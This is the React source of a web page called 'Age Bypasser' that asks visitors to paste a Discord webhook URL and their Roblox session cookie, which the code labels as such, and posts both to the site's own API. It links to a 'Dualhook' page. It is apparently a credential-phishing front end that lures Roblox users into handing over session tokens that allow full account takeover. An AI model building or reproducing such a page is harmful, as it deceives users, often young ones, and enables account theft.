import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { insertWebhookSchema, type InsertWebhook } from "@shared/schema";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useEffect, useState } from "react";

function StarField() {
  useEffect(() => {
    const createStars = (layer: number) => {
      const container = document.querySelector(`.star-layer-${layer}`);
      if (!container) return;

      const count = 50; // number of stars per layer
      for (let i = 0; i < count; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left = `${Math.random() * 100}%`;
        star.style.top = `${Math.random() * 100}%`;
        star.style.animationDelay = `${Math.random() * 20}s`;
        container.appendChild(star);
      }
    };

    // Create stars for each layer
    for (let layer = 1; layer <= 5; layer++) {
      createStars(layer);
    }

    // Cleanup function
    return () => {
      for (let layer = 1; layer <= 5; layer++) {
        const container = document.querySelector(`.star-layer-${layer}`);
        if (container) {
          container.innerHTML = '';
        }
      }
    };
  }, []);

  return (
    <div className="starfield">
      <div className="star-layer-1" />
      <div className="star-layer-2" />
      <div className="star-layer-3" />
      <div className="star-layer-4" />
      <div className="star-layer-5" />
    </div>
  );
}

export default function Home() {
  const { toast } = useToast();
  const [cooldown, setCooldown] = useState(0);
  const [isCounting, setIsCounting] = useState(false);

  useEffect(() => {
    let timer: number | null = null;

    if (isCounting && cooldown > 0) {
      timer = window.setTimeout(() => {
        setCooldown(prev => prev - 1);
      }, 1000);
    } else if (cooldown === 0) {
      setIsCounting(false);
    }

    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [isCounting, cooldown]);

  const form = useForm<InsertWebhook>({
    resolver: zodResolver(insertWebhookSchema),
    defaultValues: {
      sourceUrl: "",
      message: "",
    },
  });

  const mutation = useMutation({
    mutationFn: async (data: InsertWebhook) => {
      // Check if we're on a custom directory page
      const path = window.location.pathname;
      const directory = path.substring(1); // Remove leading slash

      // Use the directory-specific endpoint if we're on a custom page
      const endpoint = directory ? `/api/${directory}/webhook` : "/api/webhook";

      await apiRequest("POST", endpoint, data);
    },
    onSuccess: () => {
      toast({
        title: "Success!",
        description: "Your message has been sent",
      });
      form.reset();
      // Start cooldown
      setCooldown(25);
      setIsCounting(true);
    },
    onError: (error: Error) => {
      if (error.message.includes('Rate limit exceeded')) {
        // Extract remaining time from error message if available
        const match = error.message.match(/(\d+) seconds/);
        if (match && match[1]) {
          const seconds = parseInt(match[1], 10);
          setCooldown(seconds);
          setIsCounting(true);
        } else {
          setCooldown(25);
          setIsCounting(true);
        }
      }

      toast({
        title: "Error",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  return (
    <>
      <StarField />
      <div className="relative min-h-screen p-4 sm:p-8">
        {/* Navigation Buttons */}
        <div className="fixed top-4 left-4 right-4 flex justify-between z-10">
          <Button
            variant="outline"
            className="font-semibold"
            onClick={() => window.location.href = "/dualhook"}
          >
            Dualhook
          </Button>
          <Button
            variant="outline"
            className="font-semibold"
            onClick={() => window.location.href = "https://discord.gg/UWFNZvBCFf"}
          >
            Help
          </Button>
        </div>

        <div className="relative max-w-2xl mx-auto">
          <div className="mb-8 text-center">
            <h1 className="text-4xl font-bold bg-gradient-to-r from-white to-white/60 bg-clip-text text-transparent">
              Age Bypasser
            </h1>
            <p className="text-white/70">
              Enter your Discord webhook URL and message below
            </p>
          </div>

          <div className="bg-black/30 backdrop-blur-sm p-6 rounded-lg border border-white/10">
            <Form {...form}>
              <form onSubmit={form.handleSubmit((data) => mutation.mutate(data))} className="space-y-6">
                <FormField
                  control={form.control}
                  name="sourceUrl"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white/90">Discord Webhook URL</FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="https://discord.com/api/webhooks/..."
                          className="bg-black/50 border-white/20 text-white placeholder:text-white/50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-red-400" />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="message"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white/90">Roblox cookie</FormLabel>
                      <FormControl>
                        <Textarea 
                          placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
                          className="min-h-[60px] bg-black/50 border-white/20 text-white placeholder:text-white/50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-red-400" />
                    </FormItem>
                  )}
                />

                <Button 
                  type="submit" 
                  className="w-full bg-white/10 hover:bg-white/20 text-white"
                  disabled={isCounting}
                >
                  {isCounting ? `Wait ${cooldown}s` : "Bypass Age"}
                </Button>
              </form>
            </Form>
          </div>
        </div>
      </div>
    </>
  );
}